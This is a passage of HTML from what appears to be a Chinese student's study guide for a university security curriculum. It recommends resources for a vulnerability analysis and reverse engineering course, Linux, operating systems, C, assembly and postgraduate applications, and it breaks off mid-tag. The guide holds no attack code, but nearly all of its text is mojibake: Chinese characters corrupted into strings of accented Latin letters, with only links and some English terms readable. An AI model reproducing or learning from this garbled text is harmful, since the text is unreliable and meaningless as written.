ç¹è£èƒŒåï¼Œæ˜¯æ‰¾ä¸åˆ°å·¥ä½œä¸é¢è¯•ç¢°å£çš„è¿›é€€ç»´è°·â€¦â€¦</p><p>å››å¹´å¦‚å¼¹æŒ‡ä¸€æŒ¥é—´ï¼Œæˆ‘å¸Œæœ›æˆ‘æ‰€èµ°è¿‡çš„å¼¯è·¯ï¼Œåäººä¾¿ä¸å¿…å†èµ°ã€‚äººäººè–ªå°½ç«ä¼ ï¼Œæœ‰ä¸€åˆ†çƒ­ï¼Œå‘ä¸€åˆ†å…‰ï¼Œå°±ä»¤è¤ç«ä¸€èˆ¬ï¼Œä¹Ÿå¯ä»¥åœ¨é»‘æš—é‡Œå‘ä¸€ç‚¹å…‰ï¼Œä¸å¿…ç­‰å€™ç‚¬ç«ã€‚</p><p>[toc]</p><h1 id="æ¼æ´åˆ†æ-amp-é€†å‘å·¥ç¨‹"><a href="#æ¼æ´åˆ†æ-amp-é€†å‘å·¥ç¨‹" class="headerlink" title="æ¼æ´åˆ†æ &amp; é€†å‘å·¥ç¨‹"></a>æ¼æ´åˆ†æ &amp; é€†å‘å·¥ç¨‹</h1><p>ymè€å¸ˆçš„æ¼æ´åˆ†æ&amp; é€†å‘å·¥ç¨‹åº”è¯¥æ˜¯è®¡ç§‘é™¢æœ€ç¡¬æ ¸çš„è¯¾ç¨‹ï¼ˆæ²¡æœ‰ä¹‹ä¸€ï¼‰ï¼Œå¾ˆå¤šäººåæ˜ å¬ä¸æ‡‚è¿™é—¨è¯¾ç¨‹ï¼Œåœ¨ ddl å‰ä¸€æ™šé€šè¿‡ç¥–ä¼ çš„å®éªŒæŠ¥å‘Šç³Šå¼„è¿‡å»ï¼Œæ‹¿ä¸ªåŠæ ¼åˆ†æ•°å°±æ„Ÿåˆ°ä¸‡äº‹å¤§å‰ã€‚ä½†æ˜¯ï¼Œè¯·ç›¸ä¿¡ï¼Œè¿™æ˜¯æˆ‘é™¢å«é‡‘é‡æœ€é«˜çš„ä¸€é—¨è¯¾ç¨‹ï¼Œä½ çš„ä»˜å‡ºå°†ä¼šæœ‰æ‰€å›æŠ¥ã€‚</p><p>åœ¨åšæŸä¸€labçš„æ”»å‡»ä¹‹å‰ï¼Œä½ éœ€è¦ææ‡‚è¯¥æ”»å‡»å¯¹åº”çš„çš„çŸ¥è¯†ç‚¹ã€‚è¯šç„¶ï¼Œã€Šè®¡ç®—æœºå®‰å…¨å¯¼è®ºã€‹è¿™æœ¬ä¹¦å¯¹äºæ”»å‡»åŸç†çš„è®²è§£å·²ç»è¶³å¤Ÿä¼˜ç§€å’Œè¯¦ç»†ï¼Œä½†æ˜¯ç”±äºå¤§å¤šæ•°åŒå­¦å¹¶æ²¡æœ‰LinuxåŸºç¡€ï¼Œå› æ­¤å…‰çœ‹è¿™æœ¬ä¹¦ï¼Œè¿˜æ˜¯å¾ˆéš¾ç†è§£èƒŒåçš„æœºç†ã€‚å‡è®¾è¿Linuxä¸‹gccçš„å¸¸ç”¨å‘½ä»¤éƒ½ä¸æ‡‚ï¼Œé‚£ä¹ˆç›´æ¥å»åšç¼“å†²åŒºæº¢å‡ºå®éªŒï¼Œè¿™æ˜¯ååˆ†è’å”çš„ã€‚</p><p><strong>ä¸€ä¸ªæ¨èçš„å­¦ä¹ è·¯çº¿ï¼š</strong></p><ul><li><p>å®‰è£…å¹¶ä½¿ç”¨Linuxç³»ç»Ÿã€‚ä¸‹é¢æä¾›å‡ ä¸ªæ–¹æ¡ˆ,å¯ä»¥é…Œæƒ…é€‰æ‹©ä½¿ç”¨ï¼š</p><ul><li><a href="https://zhuanlan.zhihu.com/p/110128514">ä½¿ç”¨VMwareå®‰è£…Linuxè™šæ‹Ÿæœº</a>ã€‚ä½ éœ€è¦çŸ¥é“å¦‚ä½•ä½¿ç”¨VMwareæ–°å»ºè™šæ‹Ÿæœºã€ä½¿ç”¨å¿«ç…§å¤‡ä»½ç­‰åŠŸèƒ½ã€åœ¨æœ¬æœºä¸è™šæ‹Ÿæœºä¸‹ä½¿ç”¨<a href="https://www.kali.org/docs/virtualization/install-vmware-guest-tools/">VMware-tools</a>å®Œæˆæ–‡æœ¬ä¸æ–‡ä»¶çš„å¤åˆ¶ç²˜è´´</li><li>ä½¿ç”¨åŒç³»ç»Ÿæ–¹æ¡ˆ</li><li>ä½¿ç”¨ <a href="https://docs.microsoft.com/en-us/windows/wsl/install">wsl2</a></li><li>ä½¿ç”¨äº‘æœåŠ¡å™¨ã€‚å®‰è£…äº‘æœåŠ¡å™¨ï¼Œå¯ä»¥é€šè¿‡sshåœ¨ä»»ä½•ä¸€ä¸ªä¸»æœºä¸Šè¿æ¥å¹¶ä½¿ç”¨Linuxç¯å¢ƒ</li><li>ä½¿ç”¨<a href="https://hub.docker.com/_/ubuntu">docker Linuxé•œåƒ</a>ã€‚dockeræ˜¯ä¸€ä¸ªå¾ˆç«çš„è™šæ‹ŸåŒ–æ–¹å¼ï¼Œ<a href="https://hub.docker.com/_/ubuntu">docker hubä¸ŠUbuntuçš„é•œåƒ</a>å·²ç»è¢«ä¸‹è½½äº†è¶…è¿‡åäº¿æ¬¡</li></ul></li><li><p><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/Linux/%E3%80%8A%E9%B8%9F%E5%93%A5%E7%9A%84Linux%E7%A7%81%E6%88%BF%E8%8F%9C-%E5%9F%BA%E7%A1%80%E7%AF%87%E3%80%8B%E7%AC%AC%E5%9B%9B%E7%89%88.pdf">ã€Šé¸Ÿå“¥çš„Linuxç§æˆ¿èœã€‹</a></p><ul><li>è¿™æœ¬ä¹¦å¤§è€Œå…¨ï¼Œé€‚åˆä½œä¸ºå­—å…¸æŸ¥çœ‹ï¼Œæ¯”å¦‚ï¼Œä½ è¦åšç¯å¢ƒå˜é‡çš„labï¼Œé‚£ä¹ˆé™¤äº†ã€Šè®¡ç®—æœºå®‰å…¨å¯¼è®ºã€‹è¿™æœ¬ä¹¦å¤–ï¼Œä½ éœ€è¦çŸ¥é“ç¯å¢ƒå˜é‡å¯¹åº”çš„åŸºæœ¬çŸ¥è¯†ç‚¹ï¼Œé‚£ä¹ˆï¼Œç›´æ¥<code>ctrl + f</code>æœç´¢ç¯å¢ƒå˜é‡è¿™éƒ¨åˆ†çŸ¥è¯†ï¼Œä¼šè®©ä½ è¯»ã€Šè®¡ç®—æœºå®‰å…¨å¯¼è®ºã€‹è½»æ¾å¾ˆå¤š</li></ul></li><li><p>è‡ªå­¦MIT <a href="https://missing-semester-cn.github.io/">ã€Šè®¡ç®—æœºæ•™è‚²ä¸­ç¼ºå¤±çš„ä¸€è¯¾ã€‹</a></p><ul><li>è¯¥è¯¾ç¨‹åˆ—å‡ºäº†ä¸€äº›è®¡ç®—æœºä¸“ä¸šè€å¸ˆä¸ä¼šæ•™ä½†æ˜¯ååˆ†æœ‰ç”¨ï¼ˆä½ æ°¸è¿œç»•ä¸å¼€ï¼‰çš„çŸ¥è¯†ï¼Œæ¯”å¦‚shellç¼–ç¨‹ã€å‘½ä»¤è¡Œã€Git ç‰ˆæœ¬æ§åˆ¶ã€Vim çš„ä½¿ç”¨ç­‰ç­‰</li><li>åªå¬è¿™äº›è¯¾ç¨‹æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œè¿™é—¨è¯¾æ›´åƒæ˜¯ä¸€ä¸ªå¤§çº²ï¼Œå‘Šè¯‰ä½ å“ªäº›æ˜¯éœ€è¦é¢å¤–å­¦ä¹ çš„ï¼Œä¸ºäº†æ·±å…¥å­¦ä¹ æŸä¸€ä¸ªç« èŠ‚ï¼Œæ¯”å¦‚Vimï¼Œä½ åº”è¯¥å­¦ä¼šè‡ªå·±æ‰¾èµ„æ–™ã€é…ç½®Vimä»è€Œç†Ÿç»ƒæŒæ¡</li></ul></li><li><p><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2021/linux.html">æµä¼ è‡ªè¿œå¤æ—¶ä»£çš„OSå®éªŒè¯¾ç¨‹ç½‘ç«™ä¸­çš„Linuxå…¥é—¨æ•™ç¨‹</a></p><ul><li> è¿™æ˜¯ä¸€ä¸ªå¢™è£‚æ¨èçš„Linuxè‡ªå­¦æ•™ç¨‹</li><li> æƒ³åšseedlabï¼Œå­¦å¥½Linuxçš„åŸºæœ¬ä½¿ç”¨æ˜¯æœ€åŸºæœ¬çš„ï¼Œå› æ­¤æˆ‘å»ºè®®åœ¨ä»»ä½•çš„labå¼€å§‹ä¹‹å‰å­¦ä¹ å¥½ç›¸å…³åŸºæœ¬æ“ä½œ</li></ul></li><li><p>seed-labé…å¥—ç½‘ç«™</p><ul><li><a href="https://seedsecuritylabs.org/index.html">seedä¸»é¡µ</a></li><li><a href="https://seedsecuritylabs.org/Labs_20.04/">seedå®éªŒ</a></li><li><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Shellcode/">æŸä¸€å®éªŒå…·ä½“ä¸»é¡µï¼ˆä»¥Shellcode ä¸ºä¾‹ï¼‰</a></li></ul></li><li><p><a href="https://ctf-wiki.org/">ctf-wiki</a></p><ul><li>ymè€å¸ˆçš„è¯¾å¯ä»¥æ¦‚æ‹¬ä¸ºpwnå’Œé€†å‘ï¼Œè¯¥ç½‘ç«™åŒ…å«äº†å‡ ä¹ctfæ‰€æœ‰çŸ¥è¯†ç‚¹ï¼Œè¿›å»åç‚¹å‡»pwn/reverseå‘ç°æ–°ä¸–ç•Œ</li></ul></li><li><p><a href="https://www.anquanke.com/">å®‰å…¨å®¢</a></p><ul><li>ä¸€ä¸ªä¸ºå¹¿å¤§å®‰å…¨çˆ±å¥½è€…å’Œå®‰å…¨ä»ä¸šäººå‘˜æä¾›æƒå¨ä¿¡æ¯å‘å¸ƒçš„æ¼æ´ä¿¡æ¯ã€æœ€æ–°çš„å®‰å…¨èµ„è®¯ã€æœ€å…¨çš„å®‰å…¨çŸ¥è¯†åŠç²¾å½©çš„å®‰å…¨æ´»åŠ¨çš„æå…·å½±å“åŠ›çš„ä¸€ç«™å¼å®‰å…¨å¹³å° </li></ul></li><li><p><a href="https://www.freebuf.com/">FreeBuf</a></p><ul><li>å›½å†…å…³æ³¨åº¦æœ€é«˜çš„äº’è”ç½‘å®‰å…¨åª’ä½“ä¹‹ä¸€</li></ul></li><li><p><a href="https://www.anquanquan.info/">å®‰å…¨åœˆ</a></p><ul><li>ä¿¡æ¯å®‰å…¨å¯¼èˆªç½‘ç«™</li></ul></li></ul><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>ä¸ºäº†å®Œæˆæ¼æ´åˆ†æ&amp;é€†å‘å·¥ç¨‹è¯¾ç¨‹çš„å­¦ä¹ ï¼Œéœ€è¦æ‡‚å¾—ä¸€äº›åŸºæœ¬çš„LinuxçŸ¥è¯†</p><ul><li>ç†Ÿç»ƒæŒæ¡LinuxåŸºæœ¬å‘½ä»¤çš„ä½¿ç”¨ï¼Œæ¯”å¦‚ä½¿ç”¨<code>man</code>æŒ‡ä»¤æŸ¥è¯¢æ‰‹å†Œã€<code>grep</code>æŒ‡ä»¤åŒ¹é…æ¨¡å¼ä¸²ã€<code>cd</code>ã€<code>mv</code>ã€<code>cp</code>ã€<code>rm </code>ã€<code>touch</code>ã€<code>find</code>ã€<code>mkdir</code>ã€<code>ls</code>ã€<code>gcc</code>ã€<code>objdump</code>ç­‰ç­‰</li><li>ç”±äºLinuxæºç å‡ ä¹å…¨æ˜¯Cç¼–å†™ï¼Œå› æ­¤ä½ éœ€è¦æœ‰æ¯”è¾ƒæ‰å®çš„Cè¯­è¨€å’Œæ•°æ®ç»“æ„çŸ¥è¯†ï¼ŒCè¯­è¨€ä¹‹çˆ¶æ‰€è‘—çš„<a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80%20.pdf">Cç¨‹åºè®¾è®¡è¯­è¨€</a>æ˜¯ä¸€æœ¬æä½³çš„æ•™æ</li><li>ä¸ºäº†å®Œæˆä¾‹å¦‚ç¼“å†²åŒºæº¢å‡ºçš„å®éªŒï¼Œä½ éœ€è¦æœ‰æ‰å®çš„æ±‡ç¼–è¯­è¨€çŸ¥è¯†ï¼Œè¯¦è§ã€æ±‡ç¼–è¯­è¨€ã€‘ç« èŠ‚</li></ul><p><strong>Linuxçš„å­¦ä¹ èµ„æºæ¨èï¼š</strong></p><p><strong><a href="https://missing-semester-cn.github.io/">è®¡ç®—æœºæ•™è‚²ä¸­ç¼ºå¤±çš„ä¸€è¯¾</a></strong></p><ul><li>å¤§å­¦é‡Œçš„è®¡ç®—æœºè¯¾ç¨‹é€šå¸¸ä¸“æ³¨äºè®²æˆä»æ“ä½œç³»ç»Ÿåˆ°æœºå™¨å­¦ä¹ è¿™äº›å­¦é™¢æ´¾çš„è¯¾ç¨‹æˆ–ä¸»é¢˜ï¼Œè€Œå¯¹äºå¦‚ä½•ç²¾é€šå·¥å…·è¿™ä¸€ä¸»é¢˜åˆ™å¾€å¾€ä¼šç•™ç»™å­¦ç”Ÿè‡ªè¡Œæ¢ç´¢</li><li>åœ¨è¿™ä¸ªç³»åˆ—è¯¾ç¨‹ä¸­è®²æˆäº†å‘½ä»¤è¡Œã€å¼ºå¤§çš„æ–‡æœ¬ç¼–è¾‘å™¨çš„ä½¿ç”¨ã€ä½¿ç”¨ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæä¾›çš„å¤šç§ç‰¹æ€§ç­‰ç­‰ï¼ŒèŠ±æ—¶é—´æ‰“ç£¨ä½¿ç”¨è¿™äº›å·¥å…·çš„èƒ½åŠ›å¹¶èƒ½å¤Ÿæœ€ç»ˆç†Ÿç»ƒåœ°ã€æµç•…åœ°ä½¿ç”¨å®ƒä»¬æ˜¯éå¸¸æœ‰å¿…è¦çš„</li><li>è®²åº§è§†é¢‘å¯ä»¥åœ¨<a href="https://www.youtube.com/playlist?list=PLyzOVJj3bHQuloKGG59rS43e29ro7I57J">Youtube</a>ä¸Šæ‰¾åˆ°</li></ul><p><strong><a href="https://nju-projectn.github.io/ics-pa-gitbook/ics2021/linux.html">æµä¼ è‡ªè¿œå¤æ—¶ä»£çš„OSå®éªŒè¯¾ç¨‹ç½‘ç«™ä¸­çš„Linuxå…¥é—¨æ•™ç¨‹</a></strong></p><ul><li> è¿™æ˜¯ä¸€ä¸ªå¢™è£‚æ¨èçš„Linuxè‡ªå­¦æ•™ç¨‹</li><li> æƒ³åšseedlabï¼Œå­¦å¥½Linuxçš„åŸºæœ¬ä½¿ç”¨æ˜¯æœ€åŸºæœ¬çš„ï¼Œå› æ­¤æˆ‘å»ºè®®åœ¨ä»»ä½•çš„labå¼€å§‹ä¹‹å‰å­¦ä¹ å¥½ç›¸å…³åŸºæœ¬æ“ä½œ</li></ul><p><strong><a href="https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md">å‘½ä»¤è¡Œçš„è‰ºæœ¯</a></strong></p><ul><li>githubä¸Š10ä¸‡+starçš„é¡¹ç›®ï¼Œæºäºquora</li><li>å¸®ä½ æ‰“å¼€å‘½ä»¤è¡Œæ–°ä¸–ç•Œçš„å¤§é—¨</li></ul><p><strong><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/base/index.html"> Linux Tools Quick Tutorial</a></strong></p><ul><li>ä¸€ä¸ªåœ¨çº¿çš„ä¸­æ–‡Linuxæ•™ç¨‹</li></ul><h1 id="æ“ä½œç³»ç»Ÿ"><a href="#æ“ä½œç³»ç»Ÿ" class="headerlink" title="æ“ä½œç³»ç»Ÿ"></a>æ“ä½œç³»ç»Ÿ</h1><p>å®‰å¤§æ“ä½œç³»ç»Ÿè¯¾ç¨‹çš„æ•™å­¦ï¼ˆåŒ…æ‹¬å›½å†…åˆ«çš„å¾ˆå¤šå­¦æ ¡ï¼‰æ˜¯éå¸¸è½åçš„ã€‚å…ˆè¯´è¯¾æœ¬ï¼ŒåŸºæœ¬éƒ½æ˜¯ä½¶å±ˆè±ç‰™çš„å®šä¹‰å’Œæ¦‚å¿µï¼Œè®¾è®¡åˆ°å…·ä½“ä»£ç ç¼–å†™çš„åŸºæœ¬ä¸º0ï¼Œè€ƒè¯•é¢˜æ¯å¹´éƒ½å·®ä¸å¤šï¼Œæ¯”å¦‚æ¯å¹´å¿…è€ƒçš„é“¶è¡Œå®¶ç®—æ³•ï¼Œå‡ ç§è°ƒåº¦ç®—æ³•ï¼Œä¿¡å·æœºåˆ¶ï¼Œç¡¬ç”Ÿç”ŸæŠŠè¿™é—¨å®è·µè¦æ±‚æå¼ºçš„å­¦ç§‘ä¸Šæˆäº†æ–‡ç§‘â€”â€”æ¯«ä¸å¤¸å¼ çš„è¯´ï¼Œè€ƒå‰èƒŒä¸€æ™šç»å¯¹èƒ½è¿‡ã€‚</p><p>ä¸€ä¸ªæ¨èçš„å­¦ä¹ è·¯çº¿ï¼š</p><ul><li><p><a href="https://csapp.cs.cmu.edu/">csapp</a></p><ul><li><p>çœ‹å®Œã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹ï¼Œå¯¹æ±‡ç¼–ã€Cè¯­è¨€ã€é“¾æ¥ã€ä½“ç³»ç»“æ„ç­‰æœ‰åŸºæœ¬äº†è§£</p></li><li><p>è¯•ç€åšä¸€ä¸‹<a href="http://csapp.cs.cmu.edu/3e/labs.html">csappå¯¹åº”çš„lab</a>ï¼Œcsappç»å¤§å¤šæ•°çš„ç²¾åä¸åœ¨äºä¹¦æœ¬ï¼Œåœ¨äºlab</p></li></ul></li><li><p><a href="https://pages.cs.wisc.edu/~remzi/OSTEP/">ostep</a></p><ul><li>è¿™å¯èƒ½æ˜¯æœ€å¥½çš„osæ•™å­¦ä¹¦ç±ï¼Œå»ºè®®åœ¨çœ‹csappçš„åŒæ—¶è¿›è¡Œé˜…è¯»ï¼Œäº’ç›¸è¡¥å……</li><li>è¯•ç€åšä¸€ä¸‹å¯¹åº”çš„labï¼ŒåŸå› åŒä¸Š</li></ul></li></ul><p>è‡³æ­¤ï¼Œä½ çš„osæ°´å¹³å·²ç»è‡³å°‘è¶…è¿‡äº†99%çš„åŒå­¦</p><ul><li><a href="https://pdos.csail.mit.edu/6.828/2018/schedule.html">mit 6.828</a> (è¿›é˜¶é€‰æ‹©)<ul><li>è·Ÿç€å®˜ç½‘çš„scheduleèµ°ä¸€éï¼Œåšå¯¹åº”çš„labï¼Œç ”ç©¶xv6çš„æºç å®ç°</li><li><a href="https://pdos.csail.mit.edu/6.828/2018/xv6/book-rev11.pdf">xv6</a>æ˜¯MITå¼€å‘çš„ä¸€ä¸ªç±»Unixçš„æ•™å­¦æ“ä½œç³»ç»Ÿï¼Œæºç åªæœ‰å‡ ä¸‡è¡Œï¼Œå…·æœ‰å®Œå¤‡çš„æ‰‹å†Œå’Œå®ç°</li></ul></li></ul><h1 id="C-è¯­è¨€"><a href="#C-è¯­è¨€" class="headerlink" title="C è¯­è¨€"></a>C è¯­è¨€</h1><p>å¾ˆå¤šåŒå­¦è®¤ä¸ºCè¯­è¨€æ²¡æœ‰å­¦ä¹ çš„å¿…è¦ï¼Œä½†æ˜¯ç»å¤§å¤šæ•°åŒå­¦æœ‰å¿…è¦å›ç‚‰é‡é€ ä¸€éã€‚</p><p>ä¸‹é¢æ˜¯å‡ ä¸ªæœ€ç®€å•çš„Cè¯­è¨€çŸ¥è¯†ç‚¹ï¼Œå¯ä»¥è‡ªæµ‹ä¸€ä¸‹ï¼š</p><ul><li>è¯•è§£é‡Šä»¥ä¸‹Cè¯­è¨€è¯­å¥ï¼š<ul><li><code>void (*signal(int sig, void (*func)(int)))(int);</code></li><li><code>int (*(*(*pfunc)(int *))[5])(int *)</code></li></ul></li><li>.cæ–‡ä»¶åˆ°å¯æ‰§è¡Œæ–‡ä»¶è¿‡ç¨‹ä¸­ç»å†äº†å‡ ä¸ªé˜¶æ®µï¼Ÿå¯¹è¿™å‡ ä¸ªé˜¶æ®µçš„è¿‡ç¨‹(é¢„å¤„ç†ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–ï¼Œé“¾æ¥)åˆ†åˆ«åšç®€è¦å™è¿°</li><li>Cè¯­è¨€çš„å‡½æ•°è°ƒç”¨æ ˆè¿‡ç¨‹æ˜¯æ€æ ·çš„ï¼Ÿå¦‚ä½•æ„é€ ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ï¼Ÿ</li></ul><p>ä¸ºäº†å®ç°Cè¯­è¨€è¿›é˜¶ï¼Œä¸‹é¢æ˜¯å‡ æœ¬æ¨èçš„ç»å…¸ä¹¦ç±ï¼š</p><ul><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E5%92%8C%E6%8C%87%E9%92%88.pdf">Cå’ŒæŒ‡é’ˆ</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E8%AF%AD%E8%A8%80%20.pdf">Cç¨‹åºè®¾è®¡è¯­è¨€</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/main/C%E8%AF%AD%E8%A8%80%E8%BF%9B%E9%98%B6/C%E9%99%B7%E9%98%B1%E4%B8%8E%E7%BC%BA%E9%99%B7.pdf">Cé™·é˜±ä¸ç¼ºé™·</a></li><li>ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ï¼šé“¾æ¥ã€è£…è½½ä¸åº“ï¼ˆä¸è¦è¢«ä¹¦åéª—äº†ï¼Œè¿™æ˜¯ä¸€æœ¬Cè¯­è¨€è¿›é˜¶ä¹¦ç±ï¼Œè¿˜æ˜¯æ¯”è¾ƒéš¾çš„ï¼‰</li></ul><p>Linuxç¯å¢ƒä¸‹çš„Cè¯­è¨€å­¦ä¹ ï¼š</p><ul><li><a href="https://docs.huihoo.com/c/linux-c-programming/">Linux Cç¼–ç¨‹ä¸€ç«™å¼å­¦ä¹ </a></li><li><a href="https://www.sourceware.org/gdb/">gdbæ‰‹å†Œ</a></li></ul><p>ä¸€ä¸ªæ¨èçš„ C è¯­è¨€ Github ä»“åº“ï¼š</p><ul><li><a href="https://github.com/yifengyou/learn-c">ä¸æ‹©æ‰‹æ®µå­¦Cï¼Œç”¨æ±‡ç¼–å’Œä½“ç³»ç»“æ„ç›¸å…³çŸ¥è¯†ç†è§£Cè¯­è¨€æœ¬è´¨ï¼Œç”¨æ€ç»´å¯¼å›¾ç†è§£Cè¯­è¨€è¯­æ³•ã€‚æ¸…æ¸…ç™½ç™½å­¦C</a></li></ul><h1 id="æ±‡ç¼–"><a href="#æ±‡ç¼–" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h1><p>é¦–å…ˆï¼Œå­¦æ ¡çš„æ•™ææ˜¯è‡ªç¼–æ•™æï¼Œå› æ­¤è´¨é‡ä¸æ•¢æ­ç»´ã€‚å…¶æ¬¡ï¼Œå­¦æ ¡çš„æ±‡ç¼–æ•™å­¦ååˆ†å±€é™ï¼Œæ˜¯16ä½æ±‡ç¼–ã€å®æ¨¡å¼ï¼Œä¸”æ˜¯Intelçš„æ±‡ç¼–è¯­è¨€æ ¼å¼ã€‚ä½†æ˜¯ä¼—æ‰€å‘¨çŸ¥ï¼Œè‹¹æœè‡ªä»iPhone5Så‘å¸ƒå°±å¼€å§‹ä½¿ç”¨64ä½æ¶æ„ï¼Œä¸”é™¤äº†Intelçš„æ±‡ç¼–æ ¼å¼å¤–è¿˜æœ‰AT&amp;Tè¿™ç§éå¸¸å¸¸è§çš„æ ¼å¼ã€‚</p><p>ç»¼ä¸Šï¼Œæ€»ç»“ä¸‹æ¥ï¼Œå­¦æ ¡çš„æ±‡ç¼–æ•™å­¦æœ‰å¦‚ä¸‹ä¸è¶³ï¼š</p><ul><li>åªæ•™å­¦16ä½æ±‡ç¼–å†…å®¹ï¼Œä¸å½“ä»Šæµè¡Œçš„64ä½æ±‡ç¼–è„±èŠ‚</li><li>åªæ•™å­¦Intelæ ¼å¼ï¼Œæ›´é€šç”¨çš„AT&amp;Tæ ¼å¼æ²¡æœ‰æ•™å­¦ï¼ˆLinuxä¸‹åæ±‡ç¼–é»˜è®¤æ ¼å¼å°±æ˜¯AT&amp;Tæ ¼å¼ï¼‰</li><li>åªæ•™å­¦å®æ¨¡å¼ï¼Œæ²¡æœ‰æ•™å­¦ä¿æŠ¤æ¨¡å¼</li></ul><p>é’ˆå¯¹ä»¥ä¸Šå¼Šç—…ï¼Œä¸‹é¢ç»™å‡ºå‡ æœ¬ä¹¦ä»¥è‡ªå­¦ï¼š</p><ul><li>æ±‡ç¼–è¯­è¨€ ç‹çˆ½ï¼ˆè¿™æœ¬ä¹¦è®²äº†16ä½æ±‡ç¼–ï¼Œä½†æ˜¯é€šä¿—æ˜“æ‡‚ï¼Œæ¯”å­¦æ ¡æ•™æå¥½å¾ˆå¤šï¼‰</li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/tree/master/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80">x86æ±‡ç¼–è¯­è¨€_ä»å®æ¨¡å¼åˆ°ä¿æŠ¤æ¨¡å¼</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/tree/master/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80">ç¢çŸ³æˆå™¨ï¼š Windowsç¯å¢ƒä¸‹32ä½æ±‡ç¼–è¯­è¨€ç¨‹åºè®¾è®¡</a></li><li><a href="https://github.com/LaPhilosophie/AHU-CyberSecurity/blob/master/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/Computer-Systems-A-Programmers-Perspective-3rd.pdf">æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿ</a></li></ul><h1 id="ä¿ç ”"><a href="#ä¿ç ”" class="headerlink" title="ä¿ç ”"></a>ä¿ç ”</h1><p>æœ‰å¿—äºè¯»ç ”çš„åŒå­¦ï¼Œå¯ä»¥è€ƒè™‘ä¸‹ä¿ç ”ã€‚å®‰å¤§çš„ä¿ç ”ç‡è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ï¼Œæ¯å¹´éƒ½æ˜¯13%å·¦å³ã€‚å…³äºè¯¦ç»†çš„ä¿ç ”çš„ä¿¡æ¯ï¼Œæ¯”å¦‚æ¯å¹´çš„å…·ä½“æ”¿ç­–ï¼ˆå“ªäº›è¯¾ç®—åœ¨GPAæ’åå†…ï¼Œå“ªäº›ç«èµ›å¯ä»¥æå‡åæ¬¡ç­‰ï¼‰ï¼Œå»ºè®®ç§»æ­¥å­¦é™¢å®˜ç½‘çš„ç›¸å…³æ”¿ç­–æ–‡ä»¶ã€‚</p><p>å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œä½åˆ—ä¿ç ”åå•å†…ï¼Œåªæ˜¯è¯´æ˜ä½ å…·æœ‰ä¿ç ”çš„èµ„æ ¼ã€‚ä¸å…·ä½“èƒ½æ¨å…åˆ°å“ªä¸ªå­¦æ ¡æ˜¯æ— å…³çš„ã€‚æ‹¿åˆ°ä¿ç ”èµ„æ ¼åï¼Œä½ éœ€è¦å»ç”³è¯·æŸä¸€ä¸ªå­¦æ ¡çš„å¤ä»¤è¥/é¢„æ¨å…ï¼Œé€šè¿‡å¤ä»¤è¥/é¢„æ¨å…åˆç­›åï¼Œæ‰èƒ½å‚åŠ è¯¥æ ¡çš„é¢è¯•ã€ç¬”è¯•ã€æœºè¯•ï¼Œå€˜è‹¥è¿™äº›è€ƒæ ¸éƒ½é€šè¿‡äº†ï¼Œæ‰ç®—æ˜¯è¢«è¯¥æ ¡å½•å–ã€‚</p><p>å› æ­¤ï¼Œé™¤äº†GPAå¤–æ²¡æœ‰äº®çœ¼çš„ç«èµ›/é¡¹ç›®/è®ºæ–‡çš„åŒå­¦ï¼Œåœ¨å¤ä»¤è¥/é¢„æ¨å…ä¼šå¾ˆå—æ‰“å‡»ï¼Œå› ä¸ºæ’åä»…ä»…åœ¨æŠ¥åç”³è¯·çš„åˆç­›é˜¶æ®µæœ‰ç”¨ï¼Œåªè¦é€šè¿‡äº†å¤ä»¤è¥/é¢„æ¨å…åˆç­›ï¼ŒGPAæ’åä¾¿å®Œæˆäº†å®ƒçš„å†å²ä½¿å‘½ï¼Œå¤è¯•æ˜¯ç«èµ›/é¡¹ç›®/è®ºæ–‡çš„æ¯”æ‹¼ï¼ŒGPAæ’ååœ¨æ­¤æ—¶æ²¡æœ‰ä»»ä½•å½±å“ã€‚</p><p><strong>ä¿ç ”çš„å…³é”®æ—¶é—´èŠ‚ç‚¹ï¼š</strong></p><ul><li>å¤ä»¤è¥</li><li>é¢„æ¨å…</li><li>ä¹æ¨</li></ul><p><strong>ä¿ç ”ç”³è¯·æ‰€éœ€ææ–™ï¼š</strong></p><ul><li>ä¸ªäººç®€å†</li><li>æ•™æˆæ¨èä¿¡</li><li>æ¯”èµ›ã€å¥–å­¦é‡‘ã€å››å…­çº§è¯ä¹¦</li><li>é¡¹ç›®ç»å†</li><li>è®ºæ–‡å¤å°ä»¶</li></ul><p><strong>æƒ³è¦äº†è§£æ›´å¤šï¼Œè¯·è§ï¼š</strong></p><ul><li><a href="https://mubu.com/doc/klyrpL5cCB">ä¿ç ”å¤ä»¤è¥ç”³è¯·æ”»ç•¥</a></li><li><a 